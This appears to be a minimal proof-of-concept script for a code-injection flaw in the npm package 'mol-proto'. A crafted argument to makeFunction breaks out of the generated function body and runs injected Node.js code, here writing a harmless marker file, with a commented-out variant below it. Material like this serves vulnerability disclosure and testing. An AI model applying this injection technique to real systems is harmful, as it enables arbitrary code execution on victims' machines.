const mp = require("mol-proto");
mp.makeFunction("a","b", "};process.mainModule.require('fs').writeFileSync('./mol-proto-success.txt', '23');{")
// mp.makeFunction("a","b", "};process.mainModule.console.log(123);{")
